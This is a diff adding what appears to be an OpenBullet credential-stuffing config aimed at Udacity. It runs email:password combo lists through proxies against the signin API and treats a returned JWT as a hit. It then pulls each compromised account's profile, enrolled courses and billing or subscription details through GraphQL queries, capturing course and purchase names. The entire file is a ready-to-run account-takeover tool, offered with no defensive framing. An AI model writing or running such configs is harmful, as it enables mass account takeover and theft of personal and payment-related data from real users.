@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Udacity",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T10:47:32.7500395+00:00",
+  "AdditionalInfo": "Fixed capture by ReT",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://user-api.udacity.com/signin" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://auth.udacity.com" 
+  HEADER "referer: https://auth.udacity.com/sign-in?next=https://classroom.udacity.com/authenticated" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+  KEYCHAIN Success OR 
+    KEY "{\"jwt\"" 
+#PARSE_JWT PARSE "<SOURCE>" JSON "jwt" Recursive=FALSE -> VAR "JWT" "" "" 
+REQUEST POST "https://classroom-content.udacity.com/api/v1/graphql" AutoRedirect=FALSE 
+  CONTENT "{\"query\":\"    query UserBaseQuery {      user {        id        first_name        last_name        email        nickname        preferred_language        affiliate_program_key        can_see_professional_profile        can_edit_content          email_preferences {    receive_marketing  }          settings {    skip_classroom_welcome    dismissed_upgrade_ids    onboarding_completed_keys  }        social_logins {          provider          id        }        user_tags {          namespace          tag        }        nanodegrees(start_index: 0, is_graduated: false, include_free_preview: true) {          id          key          title          locale          version          semantic_type          version_upgrade_details {            updates            updates_affecting_graduation            updated_by {              first_name              last_name            }          }          user_state {            last_viewed_at          }        }        graduated_nanodegrees: nanodegrees(is_graduated: true) {          id          key          locale          version        }        courses(start_index: 0, is_graduated: false) {          id          key          title          locale          version          semantic_type          user_state {            last_viewed_at          }        }        graduated_courses: courses(is_graduated: true) {          id          key          locale          version        }      }    }  \",\"variables\":null,\"locale\":\"en-us\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <JWT>" 
+  HEADER "origin: https://classroom.udacity.com" 
+  HEADER "referer: https://classroom.udacity.com/me" 
+#CAPTURE_COURSES PARSE "<SOURCE>" LR "\",\"title\":\"" "\"" Recursive=TRUE -> CAP "Courses" "" "" 
+REQUEST POST "https://classroom-content.udacity.com/api/v1/graphql" AutoRedirect=FALSE 
+  CONTENT "{\"query\":\"    query UserBillingQuery {      user {        billing {          one_time_purchases: non_term_purchases {            urn            provider            product_key            product_variant            name            status            amount            amount_display            currency            purchased_at            refundable_until            payment_method {              ...on StripePaymentMethod {                type              }              ...on RazorpayPaymentMethod {                type              }            }          }          term_purchases {            urn            provider            product_key            product_variant            name            status            amount            amount_display            currency            cohort_id            term_id            purchased_at            started_at            refundable_until            payment_method {              ...on StripePaymentMethod {                type              }              ...on RazorpayPaymentMethod {                type              }            }          }          subscriptions {            id            urn            name            status            amount            amount_display            invoice_amount            currency            current_period_end_at            current_period_started_at            cancel_at_period_end            canceled_at            coupon {              percent_off            }            metadata {              paused              github_promo            }            trial_end            can_pause            refundability            started_at            product_key            provider            product_variant            invoice_urn          }        }      }    }  \",\"variables\":null,\"locale\":\"en-gb\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <JWT>" 
+  HEADER "origin: https://classroom.udacity.com" 
+  HEADER "referer: https://classroom.udacity.com/me" 
+PARSE "<SOURCE>" LR "\",\"name\":\"" "\"" Recursive=TRUE -> CAP "nano" "" "" 
